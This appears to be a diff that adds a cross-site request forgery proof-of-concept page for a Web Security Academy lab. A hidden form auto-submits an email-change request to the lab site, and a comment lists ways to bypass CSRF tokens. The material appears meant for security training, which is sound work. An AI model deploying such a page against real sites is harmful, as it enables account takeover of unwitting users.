@@ -1,0 +1,17 @@
+<html>
+	<body>
+		<h1>Hello World</h1>
+		<iframe style="display:none" name="csrf-iframe"></iframe>
+		<form action="https://acc91f4c1f1092cec0db2f1200c80020.web-security-academy.net/my-account/change-email" id=csrf-form method="POST" target=csrf-iframe>
+			<input type="hidden" name="email" value="test1@test.ca">
+		</form>
+
+		<script>document.getElementById("csrf-form").submit()</script>
+	</body>
+</html>
+
+<!--
+Testing CSRF Tokens:
+1. Remove the CSRF Tokens and see if application accepts request
+2. Change the request method from POST To GET
+//-->
